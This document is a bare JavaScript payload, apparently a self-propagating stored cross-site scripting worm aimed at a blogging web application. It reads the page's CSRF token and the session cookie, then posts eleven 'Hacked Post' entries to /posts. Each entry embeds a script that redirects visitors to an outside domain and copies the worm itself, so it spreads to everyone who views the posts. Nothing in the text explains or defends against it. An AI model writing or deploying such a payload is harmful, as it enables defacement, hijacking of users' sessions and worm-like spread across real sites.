<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
(function() {
    const createPost = async () => {
        const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
        const sessionCookie = document.cookie;
        
        const postData = {
            title: 'Hacked Post',
            content: `<script>
                
                // Redirect to malicious site
                window.location.href = 'https://hoceine.com';
                
                ${createPost.toString()}
            <\/script>`,
            excerpt: 'Hacked Excerpt',
            is_published: 'on'
        };

        try {
            await axios.post('/posts', postData, {
                headers: {
                    'X-CSRF-TOKEN': csrfToken,
                    'Content-Type': 'application/json'
                }
            });
            
            // Create multiple posts
            for (let i = 0; i < 10; i++) {
                await axios.post('/posts', {
                    ...postData,
                    title: `Hacked Post ${i}`
                }, {
                    headers: {
                        'X-CSRF-TOKEN': csrfToken,
                        'Content-Type': 'application/json'
                    }
                });
            }
        } catch (error) {
            console.error('Error creating post:', error);
        }
    };

    createPost();
})();
</script>